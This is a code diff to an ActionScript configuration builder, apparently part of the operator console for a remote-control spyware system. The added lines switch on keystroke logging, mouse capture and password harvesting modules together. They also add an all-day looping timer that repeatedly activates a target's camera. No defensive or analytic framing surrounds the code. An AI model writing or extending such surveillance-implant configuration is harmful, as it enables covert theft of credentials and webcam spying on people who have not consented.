@@ -31,7 +31,9 @@ package it.ht.rcs.console.operations.view.configuration.basic
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
       if (model.file)       subactions.push({action: "module", module: "file",        status: "start"});
-      if (model.screenshot) subactions.push({action: "module", module: "mouse",       status: "start"}); // I do not add screenshot here because, if enabled, it will have its own event/action
+      if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
+                            subactions.push({action: "module", module: "mouse",       status: "start"});
+                            subactions.push({action: "module", module: "password",    status: "start"}); }
       
       
       var startupEvent:Object =  {event: "timer", subtype: "startup", start: 0, ts: "00:00:00", enabled: true, desc: "STARTUP"};
@@ -46,6 +48,15 @@ package it.ht.rcs.console.operations.view.configuration.basic
         var screenshotAction:Object = {desc: "SCREENSHOT", subactions: [{action: "module", module: "screenshot", status: "start"}]};
         events.push(screenshotEvent);
         actions.push(screenshotAction);
+        index++;
+      }
+      
+      
+      if (model.camera) {
+        var cameraEvent:Object =  {event: "timer", subtype: "loop", start: index, repeat: index, delay: model.cameraDelay, iter: model.cameraIter, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "CAMERA"};
+        var cameraAction:Object = {desc: "CAMERA", subactions: [{action: "module", module: "camera", status: "start"}]};
+        events.push(cameraEvent);
+        actions.push(cameraAction);
         index++;
       }
       
